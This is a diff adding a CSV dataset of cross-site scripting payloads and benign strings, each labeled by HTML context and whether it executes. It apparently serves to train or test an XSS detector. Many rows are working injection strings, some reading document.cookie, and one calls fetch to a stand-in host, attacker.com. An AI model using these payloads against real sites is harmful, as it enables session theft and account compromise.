@@ -1,0 +1,592 @@
+payload,context,exec,combined
+<script>alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>alert(1)</script>
+<script>confirm(1)</script>,html_tag,1,CONTEXT_html_tag <script>confirm(1)</script>
+<script>prompt(1)</script>,html_tag,1,CONTEXT_html_tag <script>prompt(1)</script>
+<script>alert(document.cookie)</script>,html_tag,1,CONTEXT_html_tag <script>alert(document.cookie)</script>
+<script>fetch('http://attacker.com')</script>,html_tag,1,CONTEXT_html_tag <script>fetch('http://attacker.com')</script>
+<img src=x onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(1)>
+<body onload=alert(1)>,html_tag,1,CONTEXT_html_tag <body onload=alert(1)>
+<input onfocus=alert(1) autofocus>,html_tag,1,CONTEXT_html_tag <input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>,html_tag,1,CONTEXT_html_tag <details open ontoggle=alert(1)>
+<ScRiPt>alert(1)</ScRiPt>,html_tag,1,CONTEXT_html_tag <ScRiPt>alert(1)</ScRiPt>
+<script>alert(String.fromCharCode(49))</script>,html_tag,1,CONTEXT_html_tag <script>alert(String.fromCharCode(49))</script>
+<script>\u0061lert(1)</script>,html_tag,1,CONTEXT_html_tag <script>\u0061lert(1)</script>
+""" onmouseover=alert(1)",html_attribute,1,"CONTEXT_html_attribute "" onmouseover=alert(1)"
+"""><script>alert(1)</script>",html_attribute,1,"CONTEXT_html_attribute ""><script>alert(1)</script>"
+<svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag <svg/onload=alert(1)>
+javascript:alert(1),url_href,1,CONTEXT_url_href javascript:alert(1)
+"data:text/html,<script>alert(1)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>alert(1)</script>"
+'><svg/onload=alert(1)>,html_attribute,1,CONTEXT_html_attribute '><svg/onload=alert(1)>
+"""><img src=x onerror=confirm(1)>",html_attribute,1,"CONTEXT_html_attribute ""><img src=x onerror=confirm(1)>"
+</script><script>alert(1)</script>,script_block,1,CONTEXT_script_block </script><script>alert(1)</script>
+<script>alert(document.domain)</script>,html_tag,1,CONTEXT_html_tag <script>alert(document.domain)</script>
+<script>alert`1`</script>,html_tag,1,CONTEXT_html_tag <script>alert`1`</script>
+<script>window.alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>window.alert(1)</script>
+<script>top.alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>top.alert(1)</script>
+<script>this.alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>this.alert(1)</script>
+<img src=x onerror=confirm(1)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=prompt(1)>
+<img src=1 onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <img src=1 onerror=alert(1)>
+<img src=a onerror=alert(document.cookie)>,html_tag,1,CONTEXT_html_tag <img src=a onerror=alert(document.cookie)>
+<img src=x onerror=alert('XSS')>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(window.origin)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(window.origin)>
+<img src=x onerror=alert(location)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(location)>
+<img src=x onerror=alert(navigator.userAgent)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(navigator.userAgent)>
+<img src=x onerror=alert(document.URL)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(document.URL)>
+<svg onload=prompt(1)>,html_tag,1,CONTEXT_html_tag <svg onload=prompt(1)>
+<svg><script>alert(1)</script>,html_tag,1,CONTEXT_html_tag <svg><script>alert(1)</script>
+<svg><script>alert(document.domain)</script>,html_tag,1,CONTEXT_html_tag <svg><script>alert(document.domain)</script>
+<svg><script>confirm(1)</script>,html_tag,1,CONTEXT_html_tag <svg><script>confirm(1)</script>
+<svg><script>prompt(1)</script>,html_tag,1,CONTEXT_html_tag <svg><script>prompt(1)</script>
+<svg onload=alert(document.cookie)>,html_tag,1,CONTEXT_html_tag <svg onload=alert(document.cookie)>
+<svg onload=alert(location)>,html_tag,1,CONTEXT_html_tag <svg onload=alert(location)>
+""" onmouseover=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onmouseover=alert(1) """
+""" onclick=alert(1)",html_attribute,1,"CONTEXT_html_attribute "" onclick=alert(1)"
+""" onclick=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onclick=alert(1) """
+""" onmouseenter=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onmouseenter=alert(1) """
+onmouseover=alert(1),html_attribute,1,CONTEXT_html_attribute onmouseover=alert(1)
+""" onmouseleave=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onmouseleave=alert(1) """
+""" onkeyup=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onkeyup=alert(1) """
+""" onkeydown=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onkeydown=alert(1) """
+""" oninput=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" oninput=alert(1) """
+""" onblur=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onblur=alert(1) """
+""" onfocus=alert(1) autofocus """,html_attribute,1,"CONTEXT_html_attribute "" onfocus=alert(1) autofocus """
+""";confirm(1);//",script_block,1,"CONTEXT_script_block "";confirm(1);//"
+""";prompt(1);//",script_block,1,"CONTEXT_script_block "";prompt(1);//"
+""";alert(document.domain);//",script_block,1,"CONTEXT_script_block "";alert(document.domain);//"
+""";alert(document.cookie);//",script_block,1,"CONTEXT_script_block "";alert(document.cookie);//"
+""";alert(location);//",script_block,1,"CONTEXT_script_block "";alert(location);//"
+""";alert(window.origin);//",script_block,1,"CONTEXT_script_block "";alert(window.origin);//"
+""";alert(navigator.userAgent);//",script_block,1,"CONTEXT_script_block "";alert(navigator.userAgent);//"
+""";alert(document.title);//",script_block,1,"CONTEXT_script_block "";alert(document.title);//"
+""";alert(history.length);//",script_block,1,"CONTEXT_script_block "";alert(history.length);//"
+javascript:confirm(1),url_href,1,CONTEXT_url_href javascript:confirm(1)
+javascript:prompt(1),url_href,1,CONTEXT_url_href javascript:prompt(1)
+javascript:alert(document.domain),url_href,1,CONTEXT_url_href javascript:alert(document.domain)
+javascript:alert(document.cookie),url_href,1,CONTEXT_url_href javascript:alert(document.cookie)
+javascript:alert(location),url_href,1,CONTEXT_url_href javascript:alert(location)
+javascript:alert(window.origin),url_href,1,CONTEXT_url_href javascript:alert(window.origin)
+javascript:alert(document.title),url_href,1,CONTEXT_url_href javascript:alert(document.title)
+javascript:alert(navigator.userAgent),url_href,1,CONTEXT_url_href javascript:alert(navigator.userAgent)
+javascript:alert(history.length),url_href,1,CONTEXT_url_href javascript:alert(history.length)
+javascript:prompt(1),url_navigation,1,CONTEXT_url_navigation javascript:prompt(1)
+javascript:alert(1),url_navigation,1,CONTEXT_url_navigation javascript:alert(1)
+javascript:confirm(1),url_navigation,1,CONTEXT_url_navigation javascript:confirm(1)
+"data:text/html,<script>alert(document.domain)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>alert(document.domain)</script>"
+"data:text/html,<img src=x onerror=alert(1)>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<img src=x onerror=alert(1)>"
+"data:text/html,<svg onload=alert(1)>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<svg onload=alert(1)>"
+"data:text/html,<script>confirm(1)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>confirm(1)</script>"
+"data:text/html,<script>prompt(1)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>prompt(1)</script>"
+"data:text/html,<script>alert(document.cookie)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>alert(document.cookie)</script>"
+</pre><svg/onload=alert`1`>,html_tag,1,CONTEXT_html_tag </pre><svg/onload=alert`1`>
+</pre><img src=x onerror=alert`1`>,html_tag,1,CONTEXT_html_tag </pre><img src=x onerror=alert`1`>
+</pre><details open ontoggle=alert(1)>,html_tag,1,CONTEXT_html_tag </pre><details open ontoggle=alert(1)>
+</pre><marquee onmouseover=alert(1)>hover me</marquee,html_tag,1,CONTEXT_html_tag </pre><marquee onmouseover=alert(1)>hover me</marquee
+</pre><body onload=alert(1)>,html_tag,1,CONTEXT_html_tag </pre><body onload=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>,html_tag,1,CONTEXT_html_tag <IMG SRC=x ONERROR=alert(1)>
+<svg OnLoAd=alert(1)>,html_tag,1,CONTEXT_html_tag <svg OnLoAd=alert(1)>
+<svg/onload=alert(String.fromCharCode(49))>,html_tag,1,CONTEXT_html_tag <svg/onload=alert(String.fromCharCode(49))>
+<img src=x onerror=alert&#40;1&#41;>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert&#40;1&#41;>
+<img src=x onerror=alert&#x28;1&#x29;>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert&#x28;1&#x29;>
+<svg/onload=alert`XSS`>,html_tag,1,CONTEXT_html_tag <svg/onload=alert`XSS`>
+<img src=x onerror=alert(1)//>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(1)//>
+<img src=x onerror=alert(1)//,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(1)//
+<svg/onload=confirm`1`>,html_tag,1,CONTEXT_html_tag <svg/onload=confirm`1`>
+""" autofocus onfocus=alert(1) x=""",html_attribute,1,"CONTEXT_html_attribute "" autofocus onfocus=alert(1) x="""
+""" onpointerover=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onpointerover=alert(1) """
+""" onwheel=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onwheel=alert(1) """
+""" onauxclick=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onauxclick=alert(1) """
+<video src=x onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <audio src=x onerror=alert(1)>
+<source onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <source onerror=alert(1)>
+<meter onmouseover=alert(1)>,html_tag,1,CONTEXT_html_tag <meter onmouseover=alert(1)>
+"<iframe srcdoc=""<script>alert(1)</script>"">",html_tag,1,"CONTEXT_html_tag <iframe srcdoc=""<script>alert(1)</script>"">"
+<iframe src=javascript:alert(1)>,html_tag,1,CONTEXT_html_tag <iframe src=javascript:alert(1)>
+"<iframe src=""data:text/html,<script>alert(1)</script>"">",html_tag,1,"CONTEXT_html_tag <iframe src=""data:text/html,<script>alert(1)</script>"">"
+"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_tag,1,"CONTEXT_html_tag <iframe srcdoc=""<img src=x onerror=alert(1)>"">"
+"<iframe srcdoc=""<svg onload=alert(1)>"">",html_tag,1,"CONTEXT_html_tag <iframe srcdoc=""<svg onload=alert(1)>"">"
+"""><svg/onload=alert(1)>",html_tag,1,"CONTEXT_html_tag ""><svg/onload=alert(1)>"
+"""><svg/onload=alert(1)>",html_attribute,1,"CONTEXT_html_attribute ""><svg/onload=alert(1)>"
+"""><img src=x onerror=alert(1)>",html_tag,1,"CONTEXT_html_tag ""><img src=x onerror=alert(1)>"
+"""><img src=x onerror=alert(1)>",html_attribute,1,"CONTEXT_html_attribute ""><img src=x onerror=alert(1)>"
+</script><svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag </script><svg/onload=alert(1)>
+</script><svg/onload=alert(1)>,script_block,1,CONTEXT_script_block </script><svg/onload=alert(1)>
+</title><svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag </title><svg/onload=alert(1)>
+</textarea><svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag </textarea><svg/onload=alert(1)>
+javascript:alert`1`,url_href,1,CONTEXT_url_href javascript:alert`1`
+javascript:alert(String.fromCharCode(49)),url_href,1,CONTEXT_url_href javascript:alert(String.fromCharCode(49))
+javascript:confirm`1`,url_href,1,CONTEXT_url_href javascript:confirm`1`
+javascript:prompt`1`,url_href,1,CONTEXT_url_href javascript:prompt`1`
+"data:text/html,<svg/onload=alert(1)>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<svg/onload=alert(1)>"
+hello,html_text,0,CONTEXT_html_text hello
+john,html_text,0,CONTEXT_html_text john
+admin_user,html_text,0,CONTEXT_html_text admin_user
+test@example.com,html_text,0,CONTEXT_html_text test@example.com
+sam@gmail.com,html_text,0,CONTEXT_html_text sam@gmail.com
+3136783421,html_text,0,CONTEXT_html_text 3136783421
+id=123,html_text,0,CONTEXT_html_text id=123
+page=home,html_text,0,CONTEXT_html_text page=home
+search=laptop,html_text,0,CONTEXT_html_text search=laptop
+category=electronics,html_text,0,CONTEXT_html_text category=electronics
+sort=price_asc,html_text,0,CONTEXT_html_text sort=price_asc
+C++ programming,html_text,0,CONTEXT_html_text C++ programming
+price > 100,html_text,0,CONTEXT_html_text price > 100
+5 < 10,html_text,0,CONTEXT_html_text 5 < 10
+if (x > y),html_text,0,CONTEXT_html_text if (x > y)
+AT&T,html_text,0,CONTEXT_html_text AT&T
+R&D department,html_text,0,CONTEXT_html_text R&D department
+<b>hello</b>,html_text,0,CONTEXT_html_text <b>hello</b>
+<i>text</i>,html_text,0,CONTEXT_html_text <i>text</i>
+<div>content</div>,html_text,0,CONTEXT_html_text <div>content</div>
+<p>this is paragraph</p>,html_text,0,CONTEXT_html_text <p>this is paragraph</p>
+world,html_text,0,CONTEXT_html_text world
+test123,html_text,0,CONTEXT_html_text test123
+username,html_text,0,CONTEXT_html_text username
+admin,html_text,0,CONTEXT_html_text admin
+guest,html_text,0,CONTEXT_html_text guest
+abdDEF,html_text,0,CONTEXT_html_text abdDEF
+sample_input,html_text,0,CONTEXT_html_text sample_input
+data123,html_text,0,CONTEXT_html_text data123
+nothing_here,html_text,0,CONTEXT_html_text nothing_here
+safeText,html_text,0,CONTEXT_html_text safeText
+just_a_string,html_text,0,CONTEXT_html_text just_a_string
+randomvalue,html_text,0,CONTEXT_html_text randomvalue
+plaininput,html_text,0,CONTEXT_html_text plaininput
+normaltext,html_text,0,CONTEXT_html_text normaltext
+simpledata,html_text,0,CONTEXT_html_text simpledata
+harmless,html_text,0,CONTEXT_html_text harmless
+example123,html_text,0,CONTEXT_html_text example123
+inputdata,html_text,0,CONTEXT_html_text inputdata
+textonly,html_text,0,CONTEXT_html_text textonly
+<,html_text,0,CONTEXT_html_text <
+>,html_text,0,CONTEXT_html_text >
+<<>>,html_text,0,CONTEXT_html_text <<>>
+<><><>,html_text,0,CONTEXT_html_text <><><>
+<<test>>,html_text,0,CONTEXT_html_text <<test>>
+<hello>,html_text,0,CONTEXT_html_text <hello>
+<random>,html_text,0,CONTEXT_html_text <random>
+<tag>,html_text,0,CONTEXT_html_text <tag>
+<notatag,html_text,0,CONTEXT_html_text <notatag
+tag>,html_text,0,CONTEXT_html_text tag>
+&lt;,html_text,0,CONTEXT_html_text &lt;
+&gt;,html_text,0,CONTEXT_html_text &gt;
+&amp;,html_text,0,CONTEXT_html_text &amp;
+"""quotes""",html_text,0,"CONTEXT_html_text ""quotes"""
+'singlequotes',html_text,0,CONTEXT_html_text 'singlequotes'
+"""mixed'quotes""",html_text,0,"CONTEXT_html_text ""mixed'quotes"""
+(1+1),html_text,0,CONTEXT_html_text (1+1)
+{test},html_text,0,CONTEXT_html_text {test}
+[test],html_text,0,CONTEXT_html_text [test]
+#hashtag,html_text,0,CONTEXT_html_text #hashtag
+<script>,html_text,0,CONTEXT_html_text <script>
+</script>,html_text,0,CONTEXT_html_text </script>
+<script>alert</script,html_text,0,CONTEXT_html_text <script>alert</script
+<script>alert</script>,html_text,0,CONTEXT_html_text <script>alert</script>
+<script>alert(1),html_text,0,CONTEXT_html_text <script>alert(1)
+alert(1),html_text,0,CONTEXT_html_text alert(1)
+confirm(1),html_text,0,CONTEXT_html_text confirm(1)
+prompt(1),html_text,0,CONTEXT_html_text prompt(1)
+javascript:alert(1),html_text,0,CONTEXT_html_text javascript:alert(1)
+onerror=alert(1),html_text,0,CONTEXT_html_text onerror=alert(1)
+onload=alert(1),html_text,0,CONTEXT_html_text onload=alert(1)
+<img src=x>,html_text,0,CONTEXT_html_text <img src=x>
+<svg>,html_text,0,CONTEXT_html_text <svg>
+<iframe>,html_text,0,CONTEXT_html_text <iframe>
+<body>,html_text,0,CONTEXT_html_text <body>
+</body>,html_text,0,CONTEXT_html_text </body>
+<img src=x onerror>,html_text,0,CONTEXT_html_text <img src=x onerror>
+<svg onload>,html_text,0,CONTEXT_html_text <svg onload>
+<a href>,html_text,0,CONTEXT_html_text <a href>
+<video>,html_text,0,CONTEXT_html_text <video>
+<img src=x onerror=,html_text,0,CONTEXT_html_text <img src=x onerror=
+<svg onload=,html_text,0,CONTEXT_html_text <svg onload=
+"<a href=""javascript:"">",html_text,0,"CONTEXT_html_text <a href=""javascript:"">"
+javascript:,html_text,0,CONTEXT_html_text javascript:
+"data:text/html,",html_text,0,"CONTEXT_html_text data:text/html,"
+</img>,html_text,0,CONTEXT_html_text </img>
+<iframe src=>,html_text,0,CONTEXT_html_text <iframe src=>
+<img src>,html_text,0,CONTEXT_html_text <img src>
+<svg/,html_text,0,CONTEXT_html_text <svg/
+<<script>>,html_text,0,CONTEXT_html_text <<script>>
+<alert>,html_text,0,CONTEXT_html_text <alert>
+<onload>,html_text,0,CONTEXT_html_text <onload>
+<randomtag>,html_text,0,CONTEXT_html_text <randomtag>
+</randomtag>,html_text,0,CONTEXT_html_text </randomtag>
+<img alt=test>,html_text,0,CONTEXT_html_text <img alt=test>
+<a test>,html_text,0,CONTEXT_html_text <a test>
+<tag attribute>,html_text,0,CONTEXT_html_text <tag attribute>
+<tag attribute=value>,html_text,0,CONTEXT_html_text <tag attribute=value>
+%3Cscript%3E,html_text,0,CONTEXT_html_text %3Cscript%3E
+%3Cimg%3E,html_text,0,CONTEXT_html_text %3Cimg%3E
+%3Csvg%3E,html_text,0,CONTEXT_html_text %3Csvg%3E
+%3Ciframe%3E,html_text,0,CONTEXT_html_text %3Ciframe%3E
+%3Cbody%3E,html_text,0,CONTEXT_html_text %3Cbody%3E
+%3Calert%3E,html_text,0,CONTEXT_html_text %3Calert%3E
+%3Ctest%3E,html_text,0,CONTEXT_html_text %3Ctest%3E
+%3Ctag%3E,html_text,0,CONTEXT_html_text %3Ctag%3E
+%3Cdiv%3E,html_text,0,CONTEXT_html_text %3Cdiv%3E
+%3Cspan%3E,html_text,0,CONTEXT_html_text %3Cspan%3E
+&#60;script&#62;,html_text,0,CONTEXT_html_text &#60;script&#62;
+&#60;img&#62;,html_text,0,CONTEXT_html_text &#60;img&#62;
+&#60;svg&#62;,html_text,0,CONTEXT_html_text &#60;svg&#62;
+&#60;iframe&#62;,html_text,0,CONTEXT_html_text &#60;iframe&#62;
+&#60;body&#62;,html_text,0,CONTEXT_html_text &#60;body&#62;
+&#60;tag&#62;,html_text,0,CONTEXT_html_text &#60;tag&#62;
+&#x3C;script&#x3E;,html_text,0,CONTEXT_html_text &#x3C;script&#x3E;
+&#x3C;img&#x3E;,html_text,0,CONTEXT_html_text &#x3C;img&#x3E;
+&#x3C;svg&#x3E;,html_text,0,CONTEXT_html_text &#x3C;svg&#x3E;
+&#x3C;iframe&#x3E;,html_text,0,CONTEXT_html_text &#x3C;iframe&#x3E;
+onmouseover=alert,html_text,0,CONTEXT_html_text onmouseover=alert
+onclick=test,html_text,0,CONTEXT_html_text onclick=test
+onload=run,html_text,0,CONTEXT_html_text onload=run
+onerror=fail,html_text,0,CONTEXT_html_text onerror=fail
+href=link,html_text,0,CONTEXT_html_text href=link
+src=image,html_text,0,CONTEXT_html_text src=image
+value=test,html_text,0,CONTEXT_html_text value=test
+type=text,html_text,0,CONTEXT_html_text type=text
+name=user,html_text,0,CONTEXT_html_text name=user
+class=box,html_text,0,CONTEXT_html_text class=box
+style=color,html_text,0,CONTEXT_html_text style=color
+width=100,html_text,0,CONTEXT_html_text width=100
+height=200,html_text,0,CONTEXT_html_text height=200
+alt=image,html_text,0,CONTEXT_html_text alt=image
+title=hello,html_text,0,CONTEXT_html_text title=hello
+placeholder=name,html_text,0,CONTEXT_html_text placeholder=name
+maxlength=10,html_text,0,CONTEXT_html_text maxlength=10
+readonly=true,html_text,0,CONTEXT_html_text readonly=true
+disabled=false,html_text,0,CONTEXT_html_text disabled=false
+hello,html_tag,0,CONTEXT_html_tag hello
+hello,html_attribute,0,CONTEXT_html_attribute hello
+alert(1),script_block,0,CONTEXT_script_block alert(1)
+confirm(1),script_block,0,CONTEXT_script_block confirm(1)
+prompt(1),script_block,0,CONTEXT_script_block prompt(1)
+javascript:,url_href,0,CONTEXT_url_href javascript:
+onload=alert(1),html_attribute,0,CONTEXT_html_attribute onload=alert(1)
+onmouseover=alert(1),script_block,0,CONTEXT_script_block onmouseover=alert(1)
+onclick=test,html_attribute,0,CONTEXT_html_attribute onclick=test
+onmouseover=alert(1),html_tag,0,CONTEXT_html_tag onmouseover=alert(1)
+<img src=x onerror=alert(1)>,script_block,0,CONTEXT_script_block <img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)>,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=alert(1)>
+onload=alert(1),script_block,0,CONTEXT_script_block onload=alert(1)
+onload=alert(1),html_tag,0,CONTEXT_html_tag onload=alert(1)
+<img src=x>,html_tag,0,CONTEXT_html_tag <img src=x>
+<img src=x>,html_attribute,0,CONTEXT_html_attribute <img src=x>
+<img src=x>,script_block,0,CONTEXT_script_block <img src=x>
+<svg>,html_tag,0,CONTEXT_html_tag <svg>
+<svg>,html_attribute,0,CONTEXT_html_attribute <svg>
+<svg>,script_block,0,CONTEXT_script_block <svg>
+<iframe>,html_attribute,0,CONTEXT_html_attribute <iframe>
+<iframe>,html_tag,0,CONTEXT_html_tag <iframe>
+<iframe>,script_block,0,CONTEXT_script_block <iframe>
+<body>,html_attribute,0,CONTEXT_html_attribute <body>
+<body>,html_tag,0,CONTEXT_html_tag <body>
+<body>,script_block,0,CONTEXT_script_block <body>
+%3Cscript%3E,html_attribute,0,CONTEXT_html_attribute %3Cscript%3E
+%3Cscript%3E,html_tag,0,CONTEXT_html_tag %3Cscript%3E
+%3Cscript%3E,script_block,0,CONTEXT_script_block %3Cscript%3E
+%3Cscript%3E,url_href,0,CONTEXT_url_href %3Cscript%3E
+&#60;script&#62;,html_attribute,0,CONTEXT_html_attribute &#60;script&#62;
+&#60;script&#62;,html_tag,0,CONTEXT_html_tag &#60;script&#62;
+&#60;script&#62;,script_block,0,CONTEXT_script_block &#60;script&#62;
+&#60;script&#62;,url_href,0,CONTEXT_url_href &#60;script&#62;
+&#x3C;script&#x3E;,html_attribute,0,CONTEXT_html_attribute &#x3C;script&#x3E;
+&#x3C;script&#x3E;,html_tag,0,CONTEXT_html_tag &#x3C;script&#x3E;
+&#x3C;script&#x3E;,script_block,0,CONTEXT_script_block &#x3C;script&#x3E;
+&#x3C;script&#x3E;,url_href,0,CONTEXT_url_href &#x3C;script&#x3E;
+<script>alert(1),html_attribute,0,CONTEXT_html_attribute <script>alert(1)
+<script>alert(1),html_tag,0,CONTEXT_html_tag <script>alert(1)
+<script>alert(1),script_block,0,CONTEXT_script_block <script>alert(1)
+<script>alert(1),url_href,0,CONTEXT_url_href <script>alert(1)
+<img src=x onerror=,html_attribute,0,CONTEXT_html_attribute <img src=x onerror=
+<img src=x onerror=,html_tag,0,CONTEXT_html_tag <img src=x onerror=
+<img src=x onerror=,script_block,0,CONTEXT_script_block <img src=x onerror=
+<img src=x onerror=,url_href,0,CONTEXT_url_href <img src=x onerror=
+<svg onload,html_attribute,0,CONTEXT_html_attribute <svg onload
+<svg onload,html_tag,0,CONTEXT_html_tag <svg onload
+<svg onload,script_block,0,CONTEXT_script_block <svg onload
+<svg onload,url_href,0,CONTEXT_url_href <svg onload
+href=link,html_attribute,0,CONTEXT_html_attribute href=link
+href=link,html_tag,0,CONTEXT_html_tag href=link
+href=link,script_block,0,CONTEXT_script_block href=link
+href=link,url_href,0,CONTEXT_url_href href=link
+src=image,html_attribute,0,CONTEXT_html_attribute src=image
+src=image,html_tag,0,CONTEXT_html_tag src=image
+src=image,script_block,0,CONTEXT_script_block src=image
+src=image,url_href,0,CONTEXT_url_href src=image
+value=test,html_attribute,0,CONTEXT_html_attribute value=test
+value=test,html_tag,0,CONTEXT_html_tag value=test
+value=test,script_block,0,CONTEXT_script_block value=test
+value=test,url_href,0,CONTEXT_url_href value=test
+type=text,html_attribute,0,CONTEXT_html_attribute type=text
+type=text,html_tag,0,CONTEXT_html_tag type=text
+type=text,script_block,0,CONTEXT_script_block type=text
+type=text,url_href,0,CONTEXT_url_href type=text
+<scr<script>ipt>alert(1)</scr</script>ipt>,html_text,0,CONTEXT_html_text <scr<script>ipt>alert(1)</scr</script>ipt>
+<scr<script>ipt>alert(1)</scr</script>ipt>,html_attribute,0,CONTEXT_html_attribute <scr<script>ipt>alert(1)</scr</script>ipt>
+<scr<script>ipt>alert(1)</scr</script>ipt>,script_block,0,CONTEXT_script_block <scr<script>ipt>alert(1)</scr</script>ipt>
+<scr<script>ipt>alert(1)</scr</script>ipt>,url_href,0,CONTEXT_url_href <scr<script>ipt>alert(1)</scr</script>ipt>
+javascript:alert(1),html_attribute,0,CONTEXT_html_attribute javascript:alert(1)
+javascript:alert(1),html_tag,0,CONTEXT_html_tag javascript:alert(1)
+javascript:alert(1),script_block,0,CONTEXT_script_block javascript:alert(1)
+;alert(1);//,html_text,0,CONTEXT_html_text ;alert(1);//
+;alert(1);//,html_attribute,0,CONTEXT_html_attribute ;alert(1);//
+;alert(1);//,html_tag,0,CONTEXT_html_tag ;alert(1);//
+;alert(1);//,script_block,0,CONTEXT_script_block ;alert(1);//
+;alert(1);//,url_href,0,CONTEXT_url_href ;alert(1);//
+""";alert(1);//",html_text,0,"CONTEXT_html_text "";alert(1);//"
+""";alert(1);//",html_attribute,0,"CONTEXT_html_attribute "";alert(1);//"
+""";alert(1);//",html_tag,0,"CONTEXT_html_tag "";alert(1);//"
+""";alert(1);//",url_href,0,"CONTEXT_url_href "";alert(1);//"
+%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_text,0,CONTEXT_html_text %3Cscript%3Ealert(1)%3C%2Fscript%3E
+%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_attribute,0,CONTEXT_html_attribute %3Cscript%3Ealert(1)%3C%2Fscript%3E
+%3Cscript%3Ealert(1)%3C%2Fscript%3E,script_block,0,CONTEXT_script_block %3Cscript%3Ealert(1)%3C%2Fscript%3E
+%3Cscript%3Ealert(1)%3C%2Fscript%3E,url_href,0,CONTEXT_url_href %3Cscript%3Ealert(1)%3C%2Fscript%3E
+`;alert(1);//,html_text,0,CONTEXT_html_text `;alert(1);//
+`;alert(1);//,html_attribute,0,CONTEXT_html_attribute `;alert(1);//
+`;alert(1);//,html_tag,0,CONTEXT_html_tag `;alert(1);//
+`;alert(1);//,script_block,0,CONTEXT_script_block `;alert(1);//
+`;alert(1);//,url_href,0,CONTEXT_url_href `;alert(1);//
+""" onmouseover=alert(1) """,html_text,0,"CONTEXT_html_text "" onmouseover=alert(1) """
+""" onmouseover=alert(1) """,html_tag,0,"CONTEXT_html_tag "" onmouseover=alert(1) """
+""" onmouseover=alert(1) """,script_block,0,"CONTEXT_script_block "" onmouseover=alert(1) """
+""" onmouseover=alert(1) """,url_href,0,"CONTEXT_url_href "" onmouseover=alert(1) """
+""" onclick=alert(1) """,html_text,0,"CONTEXT_html_text "" onclick=alert(1) """
+""" onclick=alert(1) """,html_tag,0,"CONTEXT_html_tag "" onclick=alert(1) """
+""" onclick=alert(1) """,url_href,0,"CONTEXT_url_href "" onclick=alert(1) """
+""" onclick=alert(1) """,script_block,0,"CONTEXT_script_block "" onclick=alert(1) """
+""" onmouseenter=alert(1) """,html_text,0,"CONTEXT_html_text "" onmouseenter=alert(1) """
+""" onmouseenter=alert(1) """,html_tag,0,"CONTEXT_html_tag "" onmouseenter=alert(1) """
+""" onmouseenter=alert(1) """,script_block,0,"CONTEXT_script_block "" onmouseenter=alert(1) """
+""" onmouseenter=alert(1) """,url_href,0,"CONTEXT_url_href "" onmouseenter=alert(1) """
+""" onmouseleave=alert(1) """,html_tag,0,"CONTEXT_html_tag "" onmouseleave=alert(1) """
+""" onmouseleave=alert(1) """,script_block,0,"CONTEXT_script_block "" onmouseleave=alert(1) """
+""" onmouseleave=alert(1) """,html_text,0,"CONTEXT_html_text "" onmouseleave=alert(1) """
+""" onkeyup=alert(1) """,html_text,0,"CONTEXT_html_text "" onkeyup=alert(1) """
+""" onkeyup=alert(1) """,html_tag,0,"CONTEXT_html_tag "" onkeyup=alert(1) """
+""" onkeyup=alert(1) """,script_block,0,"CONTEXT_script_block "" onkeyup=alert(1) """
+""" oninput=alert(1) """,html_tag,0,"CONTEXT_html_tag "" oninput=alert(1) """
+""" oninput=alert(1) """,html_text,0,"CONTEXT_html_text "" oninput=alert(1) """
+""" oninput=alert(1) """,script_block,0,"CONTEXT_script_block "" oninput=alert(1) """
+;alert(document.domain);//,html_text,0,CONTEXT_html_text ;alert(document.domain);//
+;alert(document.domain);//,html_attribute,0,CONTEXT_html_attribute ;alert(document.domain);//
+;alert(document.domain);//,html_tag,0,CONTEXT_html_tag ;alert(document.domain);//
+;alert(document.domain);//,url_href,0,CONTEXT_url_href ;alert(document.domain);//
+""";confirm(1);//",html_text,0,"CONTEXT_html_text "";confirm(1);//"
+""";confirm(1);//",html_tag,0,"CONTEXT_html_tag "";confirm(1);//"
+""";confirm(1);//",html_attribute,0,"CONTEXT_html_attribute "";confirm(1);//"
